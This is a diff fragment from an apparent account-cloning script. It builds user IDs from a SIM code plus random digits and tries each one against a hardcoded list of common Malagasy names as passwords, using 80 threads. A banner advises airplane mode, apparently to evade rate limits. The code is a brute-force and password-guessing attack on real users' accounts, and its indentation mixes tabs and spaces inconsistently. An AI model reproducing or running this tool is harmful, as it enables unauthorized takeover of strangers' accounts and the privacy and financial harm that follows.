@@ -108,14 +108,12 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with ThreadPool(max_workers=80) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(user))
-		print(f"[+] TOTAL IDZ  : "+tl+" ")
-		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{xerxfire}')
-		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
+    with tred(max_workers=80) as Dipto:
+        tl=str(len(user))
+        print(' TOTAL ACCOUNT : '+tl)
+        print(' YOUR SIM CODE : '+kode)
+        print(' CLONING EN COURS ... ')
+        linex()
 		for guru in user:
 			uid = kode+guru
 			pwx = ['fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
